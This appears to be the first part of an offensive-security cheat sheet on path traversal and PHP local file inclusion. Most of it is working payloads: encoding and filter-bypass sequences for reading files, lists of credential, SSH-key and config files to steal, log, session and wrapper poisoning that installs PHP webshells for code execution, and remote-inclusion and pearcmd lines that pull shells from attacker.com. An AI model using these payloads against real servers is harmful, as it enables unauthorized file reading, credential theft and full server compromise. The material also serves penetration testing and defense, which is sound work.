# path-traversal-lfi-test · part 1

> 分段 1/3。完整索引见 `path-traversal-lfi-test.md`。

## 1. CORE CONCEPT

**Path Traversal**: Read arbitrary files by escaping the intended directory with `../` sequences.
**LFI**: In PHP, when user input controls `include()`/`require()` — file is **executed** as PHP code, not just read.

```
http://target.com/index.php?page=home
→ Opens: /var/www/html/pages/home.php

Traversal attack:
http://target.com/index.php?page=../../../../etc/passwd
→ Opens: /etc/passwd
```

---
## 2. TRAVERSAL SEQUENCE VARIANTS

The filtering strategy determines which encoding to use:

### Basic
```
../../../etc/passwd
..\..\..\windows\system32\drivers\etc\hosts  (Windows)
```

### URL Encoding
```
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd     ← %2f = '/'
%2e%2e%5c%2e%2e%5c%2e%2e%5c                  ← %5c = '\'
```

### Double URL Encoding (when server decodes once, filter checks before decode)
```
%252e%252e%252f%252e%252e%252f  ← %25 = %, double-encoded %2e
..%252f..%252fetc%252fpasswd
```

### Unicode / Overlong UTF-8
```
..%c0%af..%c0%af     ← overlong UTF-8 encoding of '/'
..%c1%9c..%c1%9c     ← overlong UTF-8 encoding of '\'
..%ef%bc%8f          ← fullwidth solidus '／'
```

### Mixed Encodings
```
..%2F..%2Fetc%2Fpasswd
....//....//etc/passwd   ← double-dot with slash (filter strips single ../)
```

### Filter Strips `../` (so `../` becomes `../` after strip)
```
....//          ← becomes ../ after filter strips ../
..././          ← becomes ../ after filter strips ./
```

### Null Byte Injection (legacy PHP < 5.3.4)
```
../../../../etc/passwd%00.jpg   ← %00 truncates string, strips .jpg extension
../../../../etc/passwd%00.php
```

---
## 3. TARGET FILES AND ESCALATION TARGETS

### Linux
```
/etc/passwd                  ← user list (usernames, UIDs)
/etc/shadow                  ← password hashes (requires root-level file read)
/etc/hosts                   ← internal hostnames → pivot targets
/etc/hostname                ← server hostname
/proc/self/environ           ← process environment (DB creds, API keys!)
/proc/self/cmdline           ← process command line
/proc/self/fd/0              ← stdin file descriptor
/proc/[pid]/maps             ← memory maps (loaded libraries with paths)
/var/log/apache2/access.log  ← for log poisoning
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/auth.log            ← SSH attempt log
/var/mail/www-data            ← email for www-data user
/home/USER/.ssh/id_rsa       ← SSH private key
/home/USER/.ssh/authorized_keys
/home/USER/.bash_history     ← command history (credentials!)
/home/USER/.aws/credentials  ← AWS keys
/tmp/sess_SESSIONID          ← PHP session files (if session.save_path=/tmp)
```

### Web Application Config Files
```
/var/www/html/.env           ← Laravel/Node.js env vars
/var/www/html/config.php     ← PHP config
/var/www/html/wp-config.php  ← WordPress DB credentials
/etc/apache2/sites-enabled/  ← Apache vhosts
/etc/nginx/sites-enabled/    ← Nginx config
/usr/local/etc/nginx/nginx.conf
```

### Windows
```
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\Windows\System32\config\SAM          ← NTLM hashes (often locked)
C:\inetpub\wwwroot\web.config           ← ASP.NET DB connection strings
C:\inetpub\wwwroot\global.asa
C:\xampp\htdocs\wp-config.php
C:\Users\Administrator\.ssh\id_rsa
C:\ProgramData\MySQL\MySQL Server 8\my.ini  ← MySQL config
```

---
## 4. PHP LFI → RCE TECHNIQUES

### Log Poisoning (most reliable when log is accessible)
**Step 1**: Inject PHP code into Apache/Nginx access log via User-Agent:
```http
GET / HTTP/1.1
User-Agent: <?php system($_GET['cmd']); ?>
```
**Step 2**: Include the log file via LFI:
```
?page=../../../../var/log/apache2/access.log&cmd=id
```

### SSH Log Poisoning
Inject PHP payload as SSH username:
```bash
ssh '<?php system($_GET["cmd"]); ?>'@target.com
```
Then include `/var/log/auth.log`.

### PHP Session File Poisoning
**Step 1**: Send PHP code in session-stored parameter (e.g., username), triggering storage in session file
**Step 2**: Include session file:
```
?page=../../../../tmp/sess_SESSIONID&cmd=id
```
Find session ID from cookie `PHPSESSID`.

### PHP Wrappers for RCE

**`php://expect` wrapper** (requires `expect` PHP extension):
```
?page=expect://id
```

**`php://input` wrapper** (combine LFI with POST body):
```
POST ?page=php://input
Body: <?php system('id'); ?>
```

**`data://` wrapper** (inject PHP directly as base64):
```
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=id
```
(PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4= = `<?php system($_GET['cmd']); ?>`)

---
## 5. PHP FILTER WRAPPER (FILE CONTENT READ)

Use `php://filter` to base64-encode file content to avoid null bytes, binary data:
```
?page=php://filter/convert.base64-encode/resource=config.php
?page=php://filter/convert.base64-encode/resource=/etc/passwd
?page=php://filter/read=string.rot13/resource=config.php
?page=php://filter/convert.iconv.UTF-8.UTF-16LE/resource=config.php
```
Decode the returned base64 to see the file contents (including PHP source code).

**Chain filters** (multiple transforms to bypass input filters):
```
?page=php://filter/convert.base64-encode|convert.base64-encode/resource=/etc/passwd
```

---
## 6. REMOTE FILE INCLUSION (RFI) — WHEN ENABLED

If PHP's `allow_url_include = On` (rare but exists):
```
?page=http://attacker.com/shell.txt
?page=ftp://attacker.com/shell.php
```
Host a `shell.txt` with `<?php system($_GET['cmd']); ?>`.

---
## 7. SERVER-SPECIFIC PATH TRUNCATION

PHP has a historical path length limit. Pad with `.` or `/./` to truncate appended extension:
```
?page=../../../../etc/passwd/./././././././././././............ (255+ chars)
```
When server appends `.php`, the truncation drops it.

Or null byte if PHP < 5.3.4:
```
?page=../../../../etc/passwd%00
```

---
## 8. PARAMETER LOCATIONS TO TEST

```
?file=        ?page=        ?include=    ?path=
?doc=         ?view=        ?load=       ?read=
?template=    ?lang=        ?url=        ?src=
?content=     ?site=        ?layout=     ?module=
```

Also test: HTTP headers, cookies, form `action` values, import/upload features.

---
## 9. FILTER BYPASS CHECKLIST

When `../` is stripped or blocked:

```
□ Try URL encoding: %2e%2e%2f
□ Try double URL encoding: %252e%252e%252f
□ Try overlong UTF-8: ..%c0%af / ..%ef%bc%8f
□ Try mixed: ..%2F or ..%5C (backslash on Linux)
□ Try redundant sequences: ....// or ..././ (strip once → still ../)
□ Try null byte: /../../../etc/passwd%00
□ Try absolute path: /etc/passwd (if no path prefix added)
□ Try Windows UNC (Windows server): \\127.0.0.1\C$\Windows\win.ini
```

---
## 10. IMPACT ESCALATION PATH

```
Path traversal (read arbitrary files)
├── Read /etc/passwd → enumerate users
├── Read /proc/self/environ → find API keys, DB passwords in env
├── Read app config files → find credentials → horizontal movement
├── Read SSH private keys → direct server login
└── Find log paths → Log Poisoning → LFI RCE

LFI (PHP code inclusion)
├── Log poisoning → webshell
├── Session file poisoning → webshell  
├── php://input → direct code execution
├── data:// → direct code execution
└── php://filter → read PHP source code → find more vulnerabilities
```

---
## 11. LFI TO RCE ESCALATION PATHS

| Method | Requirements | Payload |
|---|---|---|
| Log Poisoning (Apache) | LFI + Apache access.log readable | Inject `<?php system($_GET['c']);?>` in User-Agent → include `/var/log/apache2/access.log` |
| Log Poisoning (SSH) | LFI + SSH auth.log readable | SSH as `<?php system('id');?>@target` → include `/var/log/auth.log` |
| Log Poisoning (Mail) | LFI + mail log readable | Send email with PHP in subject → include `/var/log/mail.log` |
| /proc/self/fd bruteforce | LFI + Linux | Bruteforce `/proc/self/fd/0` through `/proc/self/fd/255` for open file handles containing injected content |
| /proc/self/environ | LFI + CGI/FastCGI | Inject PHP in `User-Agent` header → include `/proc/self/environ` |
| iconv CVE-2024-2961 | glibc < 2.39, PHP with `php://filter` | `php://filter/convert.iconv.UTF-8.ISO-2022-CN-EXT/resource=` chain to heap overflow → RCE. Tool: cnext-exploits |
| phpinfo() assisted | LFI + phpinfo page accessible | Race condition: upload tmp file via multipart to phpinfo → read tmp path from response → include before cleanup |
| PHP Session | LFI + session file writable | Inject PHP into session via controllable session variable → include `/tmp/sess_SESSIONID` or `/var/lib/php/sessions/sess_SESSIONID` |
| Upload race | LFI + upload endpoint | Upload PHP file → include before server-side validation/deletion |

---
## 12. PHP WRAPPER EXPLOITATION MATRIX

### php://filter (most powerful, always try first)

```text
php://filter/convert.base64-encode/resource=index.php
php://filter/read=string.rot13/resource=index.php
php://filter/convert.iconv.utf-8.utf-16/resource=index.php
php://filter/zlib.deflate/resource=index.php
```

**Filter chain RCE** (synacktiv php_filter_chain_generator):

- Chain multiple `convert.iconv` filters to write arbitrary bytes without file upload
- Tool: `synacktiv/php_filter_chain_generator` → generates chain that writes PHP code
- `python3 php_filter_chain_generator.py --chain '<?php system("id");?>'`

**convert.iconv + dechunk oracle** (blind file read):

- Tool: `synacktiv/php_filter_chains_oracle_exploit` (filters_chain_oracle_exploit)
- Enables blind LFI to read file contents character by character

### php://input

```text
POST vulnerable.php?page=php://input
Body: <?php system('id'); ?>
```

Requires `allow_url_include=On`

### data://

```text
data://text/plain,<?php system('id');?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
data:text/plain,<?php system('id');?>    ← note: no double slash variant also works
```

### phar://

```text
phar://uploaded.phar/test.php
```

Triggers deserialization of phar metadata → RCE via POP chain (requires file upload of crafted phar, can be disguised as JPEG)

### zip://

```text
zip://uploaded.zip%23shell.php
```

### expect://

```text
expect://id
```

Requires `expect` extension (rare)

---
## 13. PEARCMD LFI EXPLOITATION

When `pearcmd.php` is accessible via LFI (common in Docker PHP images):

| Method | Payload |
|---|---|
| config-create | `/?file=pearcmd.php&+config-create+/<?=phpinfo()?>+/tmp/shell.php` |
| man_dir | `/?file=pearcmd.php&+-c+/tmp/shell.php+-d+man_dir=<?=phpinfo()?>+-s+` |
| download | `/?file=pearcmd.php&+download+http://attacker.com/shell.php` |
| install | `/?file=pearcmd.php&+install+http://attacker.com/shell.tgz` |

---
## 14. WINDOWS-SPECIFIC LFI TECHNIQUES

**FindFirstFile wildcard** (Windows only):

- `<` matches any single character, `>` matches any sequence (similar to `?` and `*` but in file APIs)
- `php<<` can match `php5`, `phtml`, etc.
- `..\..\windows\win.ini` → use `<<` for fuzzy matching: `..\..\windows\win<<`

---
## 15. PARAMETER NAMING PATTERNS (HIGH-FREQUENCY TARGETS)

Based on vulnerability research statistical analysis:

| Parameter Name | Frequency | Context |
|---|---|---|
| `filename`, `file`, `path` | Very High | Direct file operations |
| `page`, `include`, `template` | High | Template/page inclusion |
| `url`, `src`, `href` | High | Resource loading |
| `download`, `read`, `load` | Medium | File download/read |
| `dir`, `folder`, `root` | Medium | Directory operations |
| `hdfile`, `inputFile`, `XFileName` | Low | CMS/middleware specific |
| `FileUrl`, `filePath`, `docPath` | Low | Enterprise app specific |

High-frequency vulnerable endpoints:

`down.php`, `download.jsp`, `download.asp`, `readfile.php`, `file_download.php`, `getfile.php`, `view.php`

---
